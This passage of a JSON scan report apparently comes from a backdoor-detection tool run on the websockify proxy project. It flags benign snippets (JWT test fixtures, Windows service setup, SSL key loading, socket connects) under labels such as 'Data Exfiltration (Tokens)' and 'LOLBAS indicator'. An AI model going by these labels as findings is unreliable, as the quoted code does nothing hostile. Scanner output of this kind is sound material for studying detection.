                    "text": "\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(key)\n\n",
                    "rendered": {
                      "text": "\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(key)\n\n",
                      "markdown": "`\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(key)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 76,
                  "startColumn": 8,
                  "endLine": 76,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        plugin = JWTTokenApi(\"wrong.pub\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(key)\n",
                    "rendered": {
                      "text": "        plugin = JWTTokenApi(\"wrong.pub\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(key)\n",
                      "markdown": "`        plugin = JWTTokenApi(\"wrong.pub\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(key)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 62,
                  "startColumn": 28,
                  "endLine": 62,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(key)\n\n",
                    "rendered": {
                      "text": "\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(key)\n\n",
                      "markdown": "`\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(key)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_token_plugins.py"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 8,
                  "endLine": 61,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        plugin = JWTTokenApi(\"./tests/fixtures/public.pem\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(key)\n",
                    "rendered": {
                      "text": "        plugin = JWTTokenApi(\"./tests/fixtures/public.pem\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(key)\n",
                      "markdown": "`        plugin = JWTTokenApi(\"./tests/fixtures/public.pem\")\n\n        key = jwk.JWK()\n        private_key = open(\"./tests/fixtures/private.pem\", \"rb\").read()\n        key.import_from_pem(private_key)\n        jwt_token = jwt.JWT({\"alg\": \"RS256\"}, {'host': \"remote_host\", 'port': \"remote_port\"})\n        jwt_token.make_signed_token(key)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/Windows/Windows Service Readme.md"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 22,
                  "endLine": 45,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\nIn the Windows Control Panel, under Services, a new \"Websockify\" service will\nappear. In its properties dialog, you can change the startup type, e.g. make\nit start automatically at boot. Or, you can start the service manually.\n\nUninstallation\n--------------\n",
                    "rendered": {
                      "text": "\nIn the Windows Control Panel, under Services, a new \"Websockify\" service will\nappear. In its properties dialog, you can change the startup type, e.g. make\nit start automatically at boot. Or, you can start the service manually.\n\nUninstallation\n--------------\n",
                      "markdown": "`\nIn the Windows Control Panel, under Services, a new \"Websockify\" service will\nappear. In its properties dialog, you can change the startup type, e.g. make\nit start automatically at boot. Or, you can start the service manually.\n\nUninstallation\n--------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/Windows/Windows Service Readme.md"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 14,
                  "endLine": 43,
                  "endColumn": 23,
                  "snippet": {
                    "text": "SrvAny.exe -install Websockify 10s \\\\\\\"C:\\Program Files\\websockify\\run.bat\\\\\\\"\n```\n\nIn the Windows Control Panel, under Services, a new \"Websockify\" service will\nappear. In its properties dialog, you can change the startup type, e.g. make\nit start automatically at boot. Or, you can start the service manually.\n\n",
                    "rendered": {
                      "text": "SrvAny.exe -install Websockify 10s \\\\\\\"C:\\Program Files\\websockify\\run.bat\\\\\\\"\n```\n\nIn the Windows Control Panel, under Services, a new \"Websockify\" service will\nappear. In its properties dialog, you can change the startup type, e.g. make\nit start automatically at boot. Or, you can start the service manually.\n\n",
                      "markdown": "`SrvAny.exe -install Websockify 10s \\\\\\\"C:\\Program Files\\websockify\\run.bat\\\\\\\"\n```\n\nIn the Windows Control Panel, under Services, a new \"Websockify\" service will\nappear. In its properties dialog, you can change the startup type, e.g. make\nit start automatically at boot. Or, you can start the service manually.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/Windows/Windows Service Readme.md"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 53,
                  "endLine": 45,
                  "endColumn": 62,
                  "snippet": {
                    "text": "\nIn the Windows Control Panel, under Services, a new \"Websockify\" service will\nappear. In its properties dialog, you can change the startup type, e.g. make\nit start automatically at boot. Or, you can start the service manually.\n\nUninstallation\n--------------\n",
                    "rendered": {
                      "text": "\nIn the Windows Control Panel, under Services, a new \"Websockify\" service will\nappear. In its properties dialog, you can change the startup type, e.g. make\nit start automatically at boot. Or, you can start the service manually.\n\nUninstallation\n--------------\n",
                      "markdown": "`\nIn the Windows Control Panel, under Services, a new \"Websockify\" service will\nappear. In its properties dialog, you can change the startup type, e.g. make\nit start automatically at boot. Or, you can start the service manually.\n\nUninstallation\n--------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/Windows/Windows Service Readme.md"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 64,
                  "endLine": 43,
                  "endColumn": 73,
                  "snippet": {
                    "text": "SrvAny.exe -install Websockify 10s \\\\\\\"C:\\Program Files\\websockify\\run.bat\\\\\\\"\n```\n\nIn the Windows Control Panel, under Services, a new \"Websockify\" service will\nappear. In its properties dialog, you can change the startup type, e.g. make\nit start automatically at boot. Or, you can start the service manually.\n\n",
                    "rendered": {
                      "text": "SrvAny.exe -install Websockify 10s \\\\\\\"C:\\Program Files\\websockify\\run.bat\\\\\\\"\n```\n\nIn the Windows Control Panel, under Services, a new \"Websockify\" service will\nappear. In its properties dialog, you can change the startup type, e.g. make\nit start automatically at boot. Or, you can start the service manually.\n\n",
                      "markdown": "`SrvAny.exe -install Websockify 10s \\\\\\\"C:\\Program Files\\websockify\\run.bat\\\\\\\"\n```\n\nIn the Windows Control Panel, under Services, a new \"Websockify\" service will\nappear. In its properties dialog, you can change the startup type, e.g. make\nit start automatically at boot. Or, you can start the service manually.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/Windows/Windows Service Readme.md"
                },
                "region": {
                  "startLine": 33,
                  "startColumn": 21,
                  "endLine": 33,
                  "endColumn": 30,
                  "snippet": {
                    "text": "Run it by hand once so that Windows asks you about a firewall exception.\nAfter confirming the exception, press `Ctrl+C` to terminate the script.\n\nThen create a Windows service for Websockify (use an Administrator command\nprompt for that). For paths with spaces, like in this example, double-escaping\nis needed: once for `cmd.exe` and once for `SrvAny.exe`.\n\n",
                    "rendered": {
                      "text": "Run it by hand once so that Windows asks you about a firewall exception.\nAfter confirming the exception, press `Ctrl+C` to terminate the script.\n\nThen create a Windows service for Websockify (use an Administrator command\nprompt for that). For paths with spaces, like in this example, double-escaping\nis needed: once for `cmd.exe` and once for `SrvAny.exe`.\n\n",
                      "markdown": "`Run it by hand once so that Windows asks you about a firewall exception.\nAfter confirming the exception, press `Ctrl+C` to terminate the script.\n\nThen create a Windows service for Websockify (use an Administrator command\nprompt for that). For paths with spaces, like in this example, double-escaping\nis needed: once for `cmd.exe` and once for `SrvAny.exe`.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/Windows/Windows Service Readme.md"
                },
                "region": {
                  "startLine": 1,
                  "startColumn": 31,
                  "endLine": 2,
                  "snippet": {
                    "text": "Running Websockify as a Windows service\n=======================================\n\nInstallation and configuration\n------------------------------\n",
                    "rendered": {
                      "text": "Running Websockify as a Windows service\n=======================================\n\nInstallation and configuration\n------------------------------\n",
                      "markdown": "`Running Websockify as a Windows service\n=======================================\n\nInstallation and configuration\n------------------------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websockifyserver.py"
                },
                "region": {
                  "startLine": 860,
                  "startColumn": 47,
                  "endLine": 860,
                  "endColumn": 51,
                  "snippet": {
                    "text": "                        startsock.close()\n        finally:\n            # Close listen port\n            self.vmsg(\"Closing socket listening at %s:%s\",\n                      self.listen_host, self.listen_port)\n            lsock.close()\n\n",
                    "rendered": {
                      "text": "                        startsock.close()\n        finally:\n            # Close listen port\n            self.vmsg(\"Closing socket listening at %s:%s\",\n                      self.listen_host, self.listen_port)\n            lsock.close()\n\n",
                      "markdown": "`                        startsock.close()\n        finally:\n            # Close listen port\n            self.vmsg(\"Closing socket listening at %s:%s\",\n                      self.listen_host, self.listen_port)\n            lsock.close()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websockifyserver.py"
                },
                "region": {
                  "startLine": 541,
                  "startColumn": 14,
                  "endLine": 541,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    def do_handshake(self, sock, address):\n        \"\"\"\n        do_handshake does the following:\n        - Peek at the first few bytes from the socket.\n        - If the connection is an HTTPS/SSL/TLS connection then SSL\n          wrap the socket.\n        - Read from the (possibly wrapped) socket.\n",
                    "rendered": {
                      "text": "    def do_handshake(self, sock, address):\n        \"\"\"\n        do_handshake does the following:\n        - Peek at the first few bytes from the socket.\n        - If the connection is an HTTPS/SSL/TLS connection then SSL\n          wrap the socket.\n        - Read from the (possibly wrapped) socket.\n",
                      "markdown": "`    def do_handshake(self, sock, address):\n        \"\"\"\n        do_handshake does the following:\n        - Peek at the first few bytes from the socket.\n        - If the connection is an HTTPS/SSL/TLS connection then SSL\n          wrap the socket.\n        - Read from the (possibly wrapped) socket.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websockifyserver.py"
                },
                "region": {
                  "startLine": 346,
                  "startColumn": 34,
                  "endLine": 347,
                  "snippet": {
                    "text": "        self.verify_client       = verify_client\n        self.daemon              = daemon\n        self.run_once            = run_once\n        self.timeout             = timeout\n        self.idle_timeout        = idle_timeout\n        self.traffic             = traffic\n        self.file_only           = file_only\n        self.web_auth            = web_auth\n",
                    "rendered": {
                      "text": "        self.verify_client       = verify_client\n        self.daemon              = daemon\n        self.run_once            = run_once\n        self.timeout             = timeout\n        self.idle_timeout        = idle_timeout\n        self.traffic             = traffic\n        self.file_only           = file_only\n        self.web_auth            = web_auth\n",
                      "markdown": "`        self.verify_client       = verify_client\n        self.daemon              = daemon\n        self.run_once            = run_once\n        self.timeout             = timeout\n        self.idle_timeout        = idle_timeout\n        self.traffic             = traffic\n        self.file_only           = file_only\n        self.web_auth            = web_auth\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websockifyserver.py"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 43,
                  "endLine": 10,
                  "endColumn": 8,
                  "snippet": {
                    "text": "Copyright 2016 Pierre Ossman\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n\n'''\n",
                    "rendered": {
                      "text": "Copyright 2016 Pierre Ossman\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n\n'''\n",
                      "markdown": "`Copyright 2016 Pierre Ossman\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n\n'''\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websockifyserver.py"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 28,
                  "endLine": 9,
                  "endColumn": 37,
                  "snippet": {
                    "text": "Copyright 2016 Pierre Ossman\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n\n",
                    "rendered": {
                      "text": "Copyright 2016 Pierre Ossman\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n\n",
                      "markdown": "`Copyright 2016 Pierre Ossman\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websockifyserver.py"
                },
                "region": {
                  "startLine": 579,
                  "startColumn": 96,
                  "endLine": 579,
                  "endColumn": 104,
                  "snippet": {
                    "text": "                if self.ssl_ciphers is not None:\n                    context.set_ciphers(self.ssl_ciphers)\n                context.options = self.ssl_options\n                context.load_cert_chain(certfile=self.cert, keyfile=self.key, password=self.key_password)\n                if self.verify_client:\n                    context.verify_mode = ssl.CERT_REQUIRED\n                    if self.cafile:\n",
                    "rendered": {
                      "text": "                if self.ssl_ciphers is not None:\n                    context.set_ciphers(self.ssl_ciphers)\n                context.options = self.ssl_options\n                context.load_cert_chain(certfile=self.cert, keyfile=self.key, password=self.key_password)\n                if self.verify_client:\n                    context.verify_mode = ssl.CERT_REQUIRED\n                    if self.cafile:\n",
                      "markdown": "`                if self.ssl_ciphers is not None:\n                    context.set_ciphers(self.ssl_ciphers)\n                context.options = self.ssl_options\n                context.load_cert_chain(certfile=self.cert, keyfile=self.key, password=self.key_password)\n                if self.verify_client:\n                    context.verify_mode = ssl.CERT_REQUIRED\n                    if self.cafile:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websockifyserver.py"
                },
                "region": {
                  "startLine": 579,
                  "startColumn": 78,
                  "endLine": 579,
                  "endColumn": 86,
                  "snippet": {
                    "text": "                if self.ssl_ciphers is not None:\n                    context.set_ciphers(self.ssl_ciphers)\n                context.options = self.ssl_options\n                context.load_cert_chain(certfile=self.cert, keyfile=self.key, password=self.key_password)\n                if self.verify_client:\n                    context.verify_mode = ssl.CERT_REQUIRED\n                    if self.cafile:\n",
                    "rendered": {
                      "text": "                if self.ssl_ciphers is not None:\n                    context.set_ciphers(self.ssl_ciphers)\n                context.options = self.ssl_options\n                context.load_cert_chain(certfile=self.cert, keyfile=self.key, password=self.key_password)\n                if self.verify_client:\n                    context.verify_mode = ssl.CERT_REQUIRED\n                    if self.cafile:\n",
                      "markdown": "`                if self.ssl_ciphers is not None:\n                    context.set_ciphers(self.ssl_ciphers)\n                context.options = self.ssl_options\n                context.load_cert_chain(certfile=self.cert, keyfile=self.key, password=self.key_password)\n                if self.verify_client:\n                    context.verify_mode = ssl.CERT_REQUIRED\n                    if self.cafile:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websockifyserver.py"
                },
                "region": {
                  "startLine": 365,
                  "startColumn": 32,
                  "endLine": 365,
                  "endColumn": 40,
                  "snippet": {
                    "text": "\n        # keyfile path must be None if not specified\n        self.key = None\n        self.key_password = key_password\n\n        # Make paths settings absolute\n        self.cert = os.path.abspath(cert)\n",
                    "rendered": {
                      "text": "\n        # keyfile path must be None if not specified\n        self.key = None\n        self.key_password = key_password\n\n        # Make paths settings absolute\n        self.cert = os.path.abspath(cert)\n",
                      "markdown": "`\n        # keyfile path must be None if not specified\n        self.key = None\n        self.key_password = key_password\n\n        # Make paths settings absolute\n        self.cert = os.path.abspath(cert)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websockifyserver.py"
                },
                "region": {
                  "startLine": 365,
                  "startColumn": 17,
                  "endLine": 365,
                  "endColumn": 25,
                  "snippet": {
                    "text": "\n        # keyfile path must be None if not specified\n        self.key = None\n        self.key_password = key_password\n\n        # Make paths settings absolute\n        self.cert = os.path.abspath(cert)\n",
                    "rendered": {
                      "text": "\n        # keyfile path must be None if not specified\n        self.key = None\n        self.key_password = key_password\n\n        # Make paths settings absolute\n        self.cert = os.path.abspath(cert)\n",
                      "markdown": "`\n        # keyfile path must be None if not specified\n        self.key = None\n        self.key_password = key_password\n\n        # Make paths settings absolute\n        self.cert = os.path.abspath(cert)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websockifyserver.py"
                },
                "region": {
                  "startLine": 322,
                  "startColumn": 48,
                  "endLine": 322,
                  "endColumn": 56,
                  "snippet": {
                    "text": "\n    def __init__(self, RequestHandlerClass, listen_fd=None,\n            listen_host='', listen_port=None, source_is_ipv6=False,\n            verbose=False, cert='', key='', key_password=None, ssl_only=None,\n            verify_client=False, cafile=None,\n            daemon=False, record='', web='', web_auth=False,\n            file_only=False,\n",
                    "rendered": {
                      "text": "\n    def __init__(self, RequestHandlerClass, listen_fd=None,\n            listen_host='', listen_port=None, source_is_ipv6=False,\n            verbose=False, cert='', key='', key_password=None, ssl_only=None,\n            verify_client=False, cafile=None,\n            daemon=False, record='', web='', web_auth=False,\n            file_only=False,\n",
                      "markdown": "`\n    def __init__(self, RequestHandlerClass, listen_fd=None,\n            listen_host='', listen_port=None, source_is_ipv6=False,\n            verbose=False, cert='', key='', key_password=None, ssl_only=None,\n            verify_client=False, cafile=None,\n            daemon=False, record='', web='', web_auth=False,\n            file_only=False,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websockifyserver.py"
                },
                "region": {
                  "startLine": 474,
                  "startColumn": 60,
                  "endLine": 474,
                  "endColumn": 68,
                  "snippet": {
                    "text": "                sock.connect(addrs[0][4])\n                if use_ssl:\n                    context = ssl.create_default_context()\n                    sock = context.wrap_socket(sock, server_hostname=host)\n            else:\n                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n                sock.bind(addrs[0][4])\n",
                    "rendered": {
                      "text": "                sock.connect(addrs[0][4])\n                if use_ssl:\n                    context = ssl.create_default_context()\n                    sock = context.wrap_socket(sock, server_hostname=host)\n            else:\n                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n                sock.bind(addrs[0][4])\n",
                      "markdown": "`                sock.connect(addrs[0][4])\n                if use_ssl:\n                    context = ssl.create_default_context()\n                    sock = context.wrap_socket(sock, server_hostname=host)\n            else:\n                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n                sock.bind(addrs[0][4])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/token_plugins.py"
                },
                "region": {
                  "startLine": 296,
                  "startColumn": 43,
                  "endLine": 296,
                  "endColumn": 49,
                  "snippet": {
                    "text": "                                 responseStr)\n                    return None\n                except KeyError:\n                    logger.error(\"Unable to find 'host' key in JSON token: %s\" %\n                                 responseStr)\n                    return None\n            elif re.match(r'\\S+:\\S+', responseStr):\n",
                    "rendered": {
                      "text": "                                 responseStr)\n                    return None\n                except KeyError:\n                    logger.error(\"Unable to find 'host' key in JSON token: %s\" %\n                                 responseStr)\n                    return None\n            elif re.match(r'\\S+:\\S+', responseStr):\n",
                      "markdown": "`                                 responseStr)\n                    return None\n                except KeyError:\n                    logger.error(\"Unable to find 'host' key in JSON token: %s\" %\n                                 responseStr)\n                    return None\n            elif re.match(r'\\S+:\\S+', responseStr):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
